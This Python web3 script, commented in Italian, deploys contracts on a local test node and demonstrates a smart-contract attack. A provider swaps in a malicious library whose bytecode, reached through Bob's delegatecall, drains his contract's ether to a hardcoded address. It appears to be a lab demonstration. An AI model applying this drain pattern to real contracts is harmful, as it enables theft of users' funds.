from web3 import Web3
import json

web3 = Web3(Web3.HTTPProvider('http://node:8545'))
if (web3.isConnected()):
    print("Connessione con il nodo riuscita" + "\n")
else:
    print("Connessione con il nodo fallita" + "\n")

bobInterface = [
	{
		"constant": False,
		"inputs": [],
		"name": "getVersion",
		"outputs": [
			{
				"name": "",
				"type": "uint256"
			}
		],
		"payable": False,
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"constant": True,
		"inputs": [],
		"name": "getBalance",
		"outputs": [
			{
				"name": "",
				"type": "uint256"
			}
		],
		"payable": False,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": True,
		"inputs": [],
		"name": "providerAddr",
		"outputs": [
			{
				"name": "",
				"type": "address"
			}
		],
		"payable": False,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": False,
		"inputs": [
			{
				"name": "n",
				"type": "uint256"
			}
		],
		"name": "containsData",
		"outputs": [
			{
				"name": "",
				"type": "bool"
			}
		],
		"payable": False,
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"constant": False,
		"inputs": [
			{
				"name": "n",
				"type": "uint256"
			}
		],
		"name": "insertData",
		"outputs": [
			{
				"name": "",
				"type": "bool"
			}
		],
		"payable": False,
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"constant": True,
		"inputs": [],
		"name": "result",
		"outputs": [
			{
				"name": "",
				"type": "uint8"
			}
		],
		"payable": False,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": False,
		"inputs": [
			{
				"name": "res",
				"type": "uint8"
			}
		],
		"name": "setResult",
		"outputs": [],
		"payable": False,
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"constant": True,
		"inputs": [
			{
				"name": "n",
				"type": "uint256"
			}
		],
		"name": "getDB",
		"outputs": [
			{
				"name": "",
				"type": "bool"
			}
		],
		"payable": False,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": False,
		"inputs": [
			{
				"name": "arg",
				"type": "address"
			}
		],
		"name": "setProvider",
		"outputs": [],
		"payable": False,
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"payable": True,
		"stateMutability": "payable",
		"type": "constructor"
	},
	{
		"payable": True,
		"stateMutability": "payable",
		"type": "fallback"
	}
]
bobInterfaceJS = json.dumps(bobInterface) 
bobBytecode = "6060604052610808806100136000396000f300606060405260043610610099576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630d8e6e2c1461009b57806312065fe0146100c4578063231505bd146100ed5780632cca928214610142578063479291ef1461017d57806365372147146101b857806380ce60d1146101e757806398c01f251461020d578063cfd8d6c014610248575b005b34156100a657600080fd5b6100ae610281565b6040518082815260200191505060405180910390f35b34156100cf57600080fd5b6100d76103fc565b6040518082815260200191505060405180910390f35b34156100f857600080fd5b61010061041b565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b341561014d57600080fd5b6101636004808035906020019091905050610440565b604051808215151515815260200191505060405180910390f35b341561018857600080fd5b61019e60048080359060200190919050506105c5565b604051808215151515815260200191505060405180910390f35b34156101c357600080fd5b6101cb61073b565b604051808260ff1660ff16815260200191505060405180910390f35b34156101f257600080fd5b61020b600480803560ff1690602001909190505061074e565b005b341561021857600080fd5b61022e600480803590602001909190505061076c565b604051808215151515815260200191505060405180910390f35b341561025357600080fd5b61027f600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610799565b005b60008060008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166331f070d96000604051602001526040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401602060405180830381600087803b151561031357600080fd5b6102c65a03f1151561032457600080fd5b5050506040518051905091508173ffffffffffffffffffffffffffffffffffffffff1661d90360405180807f76657273696f6e28290000000000000000000000000000000000000000000000815250600901905060405180910390207c01000000000000000000000000000000000000000000000000000000009004906040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818786f493505050509050600060149054906101000a900460ff1660ff169250505090565b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008060008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166331f070d96000604051602001526040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401602060405180830381600087803b15156104d257600080fd5b6102c65a03f115156104e357600080fd5b5050506040518051905091508173ffffffffffffffffffffffffffffffffffffffff1661d90360405180807f636f6e7461696e732875696e7432353629000000000000000000000000000000815250601101905060405180910390207c0100000000000000000000000000000000000000000000000000000000900490866040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808281526020019150506000604051808303818786f493505050509050600260009054906101000a900460ff1692505050919050565b60008060008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166331f070d96000604051602001526040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401602060405180830381600087803b151561065757600080fd5b6102c65a03f1151561066857600080fd5b5050506040518051905091508173ffffffffffffffffffffffffffffffffffffffff1661d90360405180807f696e736572742875696e74323536290000000000000000000000000000000000815250600f01905060405180910390207c0100000000000000000000000000000000000000000000000000000000900490866040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808281526020019150506000604051808303818786f4935050505090508092505050919050565b600060149054906101000a900460ff1681565b80600060146101000a81548160ff021916908360ff16021790555050565b60006001600001600083815260200190815260200160002060009054906101000a900460ff169050919050565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550505600a165627a7a72305820e528c05d8c68a507f407e3035cae5094599138dcf6f0a134d98e1d588840c2390029"

maliciousSetInterface = [
	{
		"constant": False,
		"inputs": [],
		"name": "version",
		"outputs": [],
		"payable": False,
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"constant": True,
		"inputs": [],
		"name": "result",
		"outputs": [
			{
				"name": "",
				"type": "uint8"
			}
		],
		"payable": False,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": False,
		"inputs": [
			{
				"name": "res",
				"type": "uint8"
			}
		],
		"name": "setResult",
		"outputs": [],
		"payable": False,
		"stateMutability": "nonpayable",
		"type": "function"
	}
]
maliciousSetInterfaceJS = json.dumps(maliciousSetInterface) 
maliciousSetBytecode = "6060604052341561000f57600080fd5b61020e8061001e6000396000f300606060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806354fd4d501461005c578063653721471461007157806380ce60d1146100a0575b600080fd5b341561006757600080fd5b61006f6100c6565b005b341561007c57600080fd5b6100846101b3565b604051808260ff1660ff16815260200191505060405180910390f35b34156100ab57600080fd5b6100c4600480803560ff169060200190919050506101c5565b005b60003073ffffffffffffffffffffffffffffffffffffffff166380ce60d160056040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808260ff168152602001915050600060405180830381600087803b151561013a57600080fd5b6102c65a03f1151561014b57600080fd5b50505073d605dfe98f168324075e2b2fab6d41b071b91c0673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050905050565b6000809054906101000a900460ff1681565b806000806101000a81548160ff021916908360ff160217905550505600a165627a7a7230582002879ded35bf5c1cb1580b076a7d4918207993d33e6bbf80c6eac5f25040c7920029"

setInterface = [
	{
		"constant": False,
		"inputs": [
			{
				"name": "value",
				"type": "uint256"
			}
		],
		"name": "remove",
		"outputs": [],
		"payable": False,
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"constant": False,
		"inputs": [],
		"name": "version",
		"outputs": [],
		"payable": False,
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"constant": True,
		"inputs": [],
		"name": "result",
		"outputs": [
			{
				"name": "",
				"type": "uint8"
			}
		],
		"payable": False,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": False,
		"inputs": [
			{
				"name": "res",
				"type": "uint8"
			}
		],
		"name": "setResult",
		"outputs": [],
		"payable": False,
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"constant": False,
		"inputs": [
			{
				"name": "value",
				"type": "uint256"
			}
		],
		"name": "insert",
		"outputs": [],
		"payable": False,
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"constant": False,
		"inputs": [
			{
				"name": "value",
				"type": "uint256"
			}
		],
		"name": "contains",
		"outputs": [],
		"payable": False,
		"stateMutability": "nonpayable",
		"type": "function"
	}
]
setInterfaceJS = json.dumps(setInterface) 
setBytecode = "6060604052341561000f57600080fd5b6102d68061001e6000396000f300606060405260043610610078576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680634cc822151461007d57806354fd4d50146100a057806365372147146100b557806380ce60d1146100e457806390b5561d1461010a578063c34052e01461012d575b600080fd5b341561008857600080fd5b61009e6004808035906020019091905050610150565b005b34156100ab57600080fd5b6100b3610182565b005b34156100c057600080fd5b6100c861020a565b604051808260ff1660ff16815260200191505060405180910390f35b34156100ef57600080fd5b610108600480803560ff1690602001909190505061021c565b005b341561011557600080fd5b61012b6004808035906020019091905050610239565b005b341561013857600080fd5b61014e600480803590602001909190505061026a565b005b60006001600001600083815260200190815260200160002060006101000a81548160ff02191690831515021790555050565b3073ffffffffffffffffffffffffffffffffffffffff166380ce60d160036040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808260ff168152602001915050600060405180830381600087803b15156101f457600080fd5b6102c65a03f1151561020557600080fd5b505050565b6000809054906101000a900460ff1681565b806000806101000a81548160ff021916908360ff16021790555050565b600180600001600083815260200190815260200160002060006101000a81548160ff02191690831515021790555050565b6001600001600082815260200190815260200160002060009054906101000a900460ff16600260006101000a81548160ff021916908315150217905550505600a165627a7a7230582083b45ea69adbd1d9bf69f5073175c6bc7841869fe12baa907b1eee9266fb2b190029"
setProviderInterface = [
	{
		"constant": False,
		"inputs": [],
		"name": "getSet",
		"outputs": [
			{
				"name": "",
				"type": "address"
			}
		],
		"payable": False,
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"constant": False,
		"inputs": [
			{
				"name": "arg",
				"type": "address"
			}
		],
		"name": "updateLibrary",
		"outputs": [],
		"payable": False,
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"constant": True,
		"inputs": [],
		"name": "owner",
		"outputs": [
			{
				"name": "",
				"type": "address"
			}
		],
		"payable": False,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": True,
		"inputs": [],
		"name": "setLibAddr",
		"outputs": [
			{
				"name": "",
				"type": "address"
			}
		],
		"payable": False,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"payable": False,
		"stateMutability": "nonpayable",
		"type": "constructor"
	}
]
setProviderInterfaceJS = json.dumps(setProviderInterface) 
setProviderBytecode = "6060604052341561000f57600080fd5b33600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506102d98061005f6000396000f300606060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806331f070d91461006757806383b2c476146100bc5780638da5cb5b146100f55780639665bbd21461014a575b600080fd5b341561007257600080fd5b61007a61019f565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34156100c757600080fd5b6100f3600480803573ffffffffffffffffffffffffffffffffffffffff169060200190919050506101c8565b005b341561010057600080fd5b610108610262565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b341561015557600080fd5b61015d610288565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141561025f57806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b50565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16815600a165627a7a7230582023b5769a6fbe70c5787dedb6a6d996f72c7e9fd78886b8f77bb6883b51512b100029"

accounts = web3.eth.accounts
# Set dell'account con il quale farò i deploy
web3.eth.defaultAccount = web3.eth.accounts[0]
print("Account di default:\n" + accounts[0] + "\n")

# Definisco un oggetto contratto bob a partire dall'interfaccia e dal bytecode
bobContract = web3.eth.contract(abi=bobInterfaceJS, bytecode=bobBytecode)
# Costruisco la transazione per fare il deploy del contratto bob
contract_data = bobContract.constructor().buildTransaction({'value': 5000000000000000000})
# Spedisco la transazione 
deploy_txn = web3.eth.sendTransaction(contract_data)
#Attendo che la mia transazione venga elaborata e prendo la ricevuta
txn_receipt = web3.eth.waitForTransactionReceipt(deploy_txn)
# Salvo in un oggetto il contratto deployato
contract_bob = web3.eth.contract(address=txn_receipt.contractAddress, abi=bobInterfaceJS)
# Funzioni del contratto bob
print("Funzioni offerte dal contratto bob:\n" + str(contract_bob.all_functions()) + "\n")
# Bilancio del contratto bob
print("Bilancio del contratto bob:\n" + str(web3.eth.getBalance(contract_bob.address)) + "\n")

# Definisco un oggetto contratto set a partire dall'interfaccia e dal bytecode
setContract = web3.eth.contract(abi=setInterfaceJS, bytecode=setBytecode)
# Costruisco la transazione per fare il deploy del contratto set
contract_data = setContract.constructor().buildTransaction({'from': accounts[1]})
# Spedisco la transazione 
deploy_txn = web3.eth.sendTransaction(contract_data)
#Attendo che la mia transazione venga elaborata e prendo la ricevuta
txn_receipt = web3.eth.waitForTransactionReceipt(deploy_txn)
# Salvo in un oggetto il contratto deployato
contract_set = web3.eth.contract(address=txn_receipt.contractAddress, abi=setInterfaceJS)
# Funzioni del contratto set
print("Funzioni offerte dal contratto set:\n" + str(contract_set.all_functions()) + "\n")

# Definisco un oggetto contratto maliciousSet a partire dall'interfaccia e dal bytecode
maliciousSetContract = web3.eth.contract(abi=maliciousSetInterfaceJS, bytecode=maliciousSetBytecode)
# Costruisco la transazione per fare il deploy del contratto maliciousSet
contract_data = maliciousSetContract.constructor().buildTransaction({'from': accounts[1]})
# Spedisco la transazione 
deploy_txn = web3.eth.sendTransaction(contract_data)
#Attendo che la mia transazione venga elaborata e prendo la ricevuta
txn_receipt = web3.eth.waitForTransactionReceipt(deploy_txn)
# Salvo in un oggetto il contratto deployato
contract_maliciousSet = web3.eth.contract(address=txn_receipt.contractAddress, abi=maliciousSetInterfaceJS)
# Funzioni del contratto maliciousSet
print("Funzioni offerte dal contratto maliciousSet:\n" + str(contract_maliciousSet.all_functions()) + "\n")
# Stampa dell'addr a cui andranno i soldi
# print("A chi andrà il bottino(attackerAddr):\n" + str(contract_maliciousSet.functions.attackerAddr().call()) + "\n")

# Definisco un oggetto contratto setProvider a partire dall'interfaccia e dal bytecode
setProviderContract = web3.eth.contract(abi=setProviderInterfaceJS, bytecode=setProviderBytecode)
# Costruisco la transazione per fare il deploy del contratto setProvider
contract_data = setProviderContract.constructor().buildTransaction({'from': accounts[1]})
# Spedisco la transazione 
deploy_txn = web3.eth.sendTransaction(contract_data)
#Attendo che la mia transazione venga elaborata e prendo la ricevuta
txn_receipt = web3.eth.waitForTransactionReceipt(deploy_txn)
# Salvo in un oggetto il contratto deployato
contract_setProvider = web3.eth.contract(address=txn_receipt.contractAddress, abi=setProviderInterfaceJS)
# Funzioni del contratto setProvider
print("Funzioni offerte dal contratto setProvider:\n" + str(contract_setProvider.all_functions()) + "\n")

print("=========================BOB SETUP===============================")
# Stampa del provider di Bob
print("Provider di Bob:\n" + str(contract_bob.functions.providerAddr().call()) + "\n")
# Settiamo il provider di Bob
contract_bob.functions.setProvider(contract_setProvider.address).transact()
# Stampa del provider di Bob
print("Provider di Bob:\n" + str(contract_bob.functions.providerAddr().call()) + "\n")

print("=========================PROVIDER SETUP===============================")
# Stampa di set di setProvider
print("set di setProvider:\n" + str(contract_setProvider.functions.setLibAddr().call()) + "\n")
# Settiamo il set di setProvider (devo usare l'account owner altrimenti non la cambia)
contract_setProvider.functions.updateLibrary(contract_set.address).transact({'from': accounts[1]})
# Stampa di set di setProvider
print("set di setProvider:\n" + str(contract_setProvider.functions.setLibAddr().call()) + "\n")

# Vediamo se anche Bob vede la stessa libreria
print("Versione della libreria set che vede Bob:\n" + str(contract_bob.functions.getVersion().call()) + "\n")

print("test:\n" + str(contract_bob.functions.insertData(3).transact()) + "\n")
print("test:\n" + str(contract_bob.functions.getDB(3).call()) + "\n")

# Adesso il provider malevolo aggiorna la libreria
contract_setProvider.functions.updateLibrary(contract_maliciousSet.address).transact({'from': accounts[1]})
print("Aggiornamento della libreria del provider malevolo....")
# Stampa di set di setProvider
print("set di setProvider:\n" + str(contract_setProvider.functions.setLibAddr().call()) + "\n")

# Ricordiamo che i soldi vanno a questo account che adesso ha questi ether
print("Bilancio dell'account prima dell'attacco:\n" + str(web3.eth.getBalance(contract_bob.address)) + "\n")
print("Bilancio dell'account prima dell'attacco:\n" + str(web3.eth.getBalance(accounts[1])) + "\n")
# Quando Bob fa getVersion vede la libreria aggiornata ma perde tutti i soldi
x = contract_bob.functions.getVersion().transact() # altrimenti con call non manda la transazione
print("Versione della libreria set che vede Bob:\n" + str(contract_bob.functions.getVersion().call()) + "\n")
# Dopo l'attacco
print("Bilancio dell'account dopo l'attacco:\n" + str(web3.eth.getBalance(contract_bob.address)) + "\n")
print("Bilancio dell'account dopo l'attacco:\n" + str(web3.eth.getBalance(accounts[1])) + "\n")